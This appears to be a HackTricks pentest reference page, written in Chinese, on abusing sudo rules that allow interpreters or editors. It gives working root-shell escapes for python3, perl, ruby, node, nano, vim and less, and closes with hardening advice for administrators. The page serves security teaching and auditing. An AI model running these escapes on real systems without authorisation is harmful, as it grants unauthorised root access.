# Sudo 命令滥用

{{#include ../../banners/hacktricks-training.md}}

## Sudo 允许的解释器

如果 `sudo -l` 允许用户以 root 身份运行解释器，应将其视为直接代码执行。解释器就是为执行任意代码而设计的，因此允许运行 `python3`、`perl`、`ruby`、`lua`、`node` 或类似 binary 的规则，通常等同于允许执行 root 命令，除非其参数受到严格限制并经过验证。

常见的审查流程：
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
其他解释器示例：
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
路径必须完全匹配。如果 sudo 规则允许使用 `/usr/bin/python3`，请在验证期间使用该确切路径：
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo-allowed editors

如果 `sudo -l` 允许用户以 root 身份运行交互式 editor，应将其视为 command-execution surface，而不是无害的文件编辑权限。editor 通常可以执行 shell commands、读取任意文件、写入任意文件，或从 editor 内部调用外部 helpers。

常见的审查流程：
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano 命令执行

当允许通过 sudo 使用 `nano` 时，可以从编辑器界面执行命令：
```text
Ctrl+R
Ctrl+X
```
然后提供如下命令：
```bash
id
/bin/sh
```
在某些终端中，交互式 shell 可能需要重定向标准流：
```bash
reset; /bin/sh 1>&0 2>&0
```
确切的按键序列可能因 nano 版本和构建选项而异，但安全问题相同：编辑器正以 root 身份运行，并且可以调用外部命令。

### 其他常见的 editor escapes

Vim-style editors 通常通过 `:!` 提供命令执行功能：
```text
:!/bin/sh
```
诸如 `less` 这样的分页器也可能暴露 shell 执行功能：
```text
!/bin/sh
```
## 防御要点

- 避免通过 sudo 授予对 interpreters 或交互式 editors 的访问权限。
- 优先使用由 root 所有、仅执行单一管理操作的固定 wrappers。
- 如果无法避免使用 interpreter，应限制确切的 script 路径，并禁止用户控制的 arguments、可写入的 imports、`PYTHONPATH` 以及不安全的环境保留。
- 如果需要编辑文件，应限制确切的文件路径，并考虑使用 `sudoedit`，同时确保 sudo 版本已修补并严格处理环境。
- 检查 `SETENV`、`env_keep`、可写入的工作目录、可写入的 module/import 路径、`NOEXEC`、`use_pty` 和 logging，但不要将它们视为完整的 sandbox。
{{#include ../../banners/hacktricks-training.md}}
